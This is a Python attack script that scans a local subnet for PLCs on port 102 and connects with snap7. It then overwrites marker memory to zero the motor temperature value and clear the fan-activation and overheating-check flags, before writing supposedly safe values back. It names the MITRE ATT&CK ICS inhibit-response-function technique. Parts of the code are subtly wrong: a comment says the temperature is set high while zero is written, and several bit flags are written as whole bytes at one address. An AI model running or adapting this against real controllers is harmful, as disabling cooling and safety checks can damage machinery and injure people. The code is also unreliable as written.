import snap7
import time
import os
import subprocess

# Configuration
PLC_IP = None  # Placeholder, will be discovered if not provided
RACK = 0
SLOT = 1
MOTOR_TEMP_ADDRESS = 7  # MW7 address for Motor_Temp
ACTIVATE_FAN_A_ADDRESS = 0  # M0.0 address for Activate_Fan_A
ACTIVATE_FAN_B_ADDRESS = 0  # M0.1 address for Activate_Fan_B
OVERHEATING_CHECK_ADDRESS = 0 # M0.2 address for Overheating_Check
TAG_2_ADDRESS = 0 # M0.4 address for Tag_2

# Define threshold for temperature (mimicking the PLC logic)
OVERHEAT_TEMP = 450  # Exaggerated overheat temperature
NORMAL_TEMP = 200 # Lower than FC1 threshold


def find_plc_ip():
    """
    Attempts to discover the PLC IP address using nmap.
    Requires nmap to be installed on the system.
    """
    try:
        # Adjust the IP range to match your network
        nmap_output = subprocess.check_output(["nmap", "-p", "102", "192.168.1.0/24"]).decode()
        for line in nmap_output.splitlines():
            if "102/tcp" in line and "open" in line:
                PLC_IP = line.split()[4]
                print(f"PLC IP address found: {PLC_IP}")
                return PLC_IP
    except subprocess.CalledProcessError:
        print("Error: nmap scan failed.  Ensure nmap is installed and in your system's PATH.")
    except Exception as e:
        print(f"Error during IP discovery: {e}")
    return None

def connect_to_plc(ip):
    """
    Connects to the PLC using snap7.

    Args:
        ip (str): The IP address of the PLC.

    Returns:
        snap7.client.Client: A snap7 client object if connection is successful, None otherwise.
    """
    plc = snap7.client.Client()
    try:
        plc.connect(ip, RACK, SLOT)
        print(f"Successfully connected to PLC at {ip}")
        return plc
    except Exception as e:
        print(f"Error connecting to PLC at {ip}: {e}")
        return None

def read_memory(plc, area, db_number, start, size):
    """
    Reads a block of memory from the PLC.

    Args:
        plc (snap7.client.Client): The snap7 client object.
        area (int): The memory area (e.g., snap7.constants.Areas.MK for markers).
        db_number (int): The DB number (0 for markers).
        start (int): The starting byte address.
        size (int): The number of bytes to read.

    Returns:
        bytearray: The data read from the PLC, or None if an error occurred.
    """
    try:
        data = plc.read_area(area, db_number, start, size)
        return data
    except Exception as e:
        print(f"Error reading memory: {e}")
        return None

def write_memory(plc, area, db_number, start, data):
    """
    Writes data to the PLC memory.

    Args:
        plc (snap7.client.Client): The snap7 client object.
        area (int): The memory area (e.g., snap7.constants.Areas.MK for markers).
        db_number (int): The DB number (0 for markers).
        start (int): The starting byte address.
        data (bytearray): The data to write.
    """
    try:
        plc.write_area(area, db_number, start, data)
        print(f"Successfully wrote data to PLC at address: Area:{area} DBNumber:{db_number} Start:{start}")
    except Exception as e:
        print(f"Error writing memory: {e}")


def destroy_response_functions(plc):
    """
    Simulates data destruction by writing dummy data to critical memory locations
    related to fan control and safety mechanisms.  This directly targets
    the inhibit-response-function MITRE ATT&CK technique.
    """

    # Create dummy data (all zeros)
    dummy_int_data = bytearray([0, 0]) # For Motor_Temp
    dummy_bool_data = bytearray([0])   # For booleans

    # 1. Tamper with Motor_Temp (MW7)
    # Setting it to a very high value simulates a faulty sensor,
    # potentially overriding safety limits and preventing fan activation
    write_memory(plc, snap7.constants.Areas.MK, 0, MOTOR_TEMP_ADDRESS, dummy_int_data)
    print("Motor temperature data tampered with (set to zero).")

    # 2. Disable Activate_Fan_A (M0.0) and Activate_Fan_B (M0.1)
    # This directly prevents the fans from being turned on, regardless of temperature.
    write_memory(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_A_ADDRESS, dummy_bool_data)
    write_memory(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_B_ADDRESS, dummy_bool_data)
    print("Fan activation flags disabled.")

     # 3. Reset Overheating_Check (M0.2)
    write_memory(plc, snap7.constants.Areas.MK, 0, OVERHEATING_CHECK_ADDRESS, dummy_bool_data)
    print("Overheating Check flag reset.")

     # 4. Reset Tag_2 (M0.4) - important for timer logic in FC2
    write_memory(plc, snap7.constants.Areas.MK, 0, TAG_2_ADDRESS, dummy_bool_data)
    print("Tag_2 flag reset.")

def restore_plc_state(plc):
    """
    Restores the PLC memory to a safe state.  This function is important
    to avoid leaving the PLC in a damaged or unsafe configuration.
    """

    # Create safe data
    safe_temp_data = bytearray([(NORMAL_TEMP >> 8) & 0xFF, NORMAL_TEMP & 0xFF]) # Motor_Temp to normal
    safe_bool_data = bytearray([0])

    # 1. Restore Motor_Temp to a normal value
    write_memory(plc, snap7.constants.Areas.MK, 0, MOTOR_TEMP_ADDRESS, safe_temp_data)
    print("Motor temperature data restored to normal.")

    # 2. Ensure Activate_Fan_A and Activate_Fan_B are initially off (safe state)
    write_memory(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_A_ADDRESS, safe_bool_data)
    write_memory(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_B_ADDRESS, safe_bool_data)
    print("Fan activation flags set to off (safe state).")

     # 3. Reset Overheating_Check (M0.2)
    write_memory(plc, snap7.constants.Areas.MK, 0, OVERHEATING_CHECK_ADDRESS, safe_bool_data)
    print("Overheating Check flag reset.")

     # 4. Reset Tag_2 (M0.4) - important for timer logic in FC2
    write_memory(plc, snap7.constants.Areas.MK, 0, TAG_2_ADDRESS, safe_bool_data)
    print("Tag_2 flag reset.")

if __name__ == "__main__":
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("PLC IP address not found. Please provide the PLC IP or ensure nmap is installed and configured correctly.")
            exit()

    plc = connect_to_plc(PLC_IP)

    if plc:
        try:
            # Simulate the attack
            destroy_response_functions(plc)

            #Give it some time for effect
            time.sleep(5)

            # Restore the PLC to a safe state.  CRITICAL to prevent damage.
            restore_plc_state(plc)

        finally:
            plc.disconnect()
            print("Disconnected from PLC.")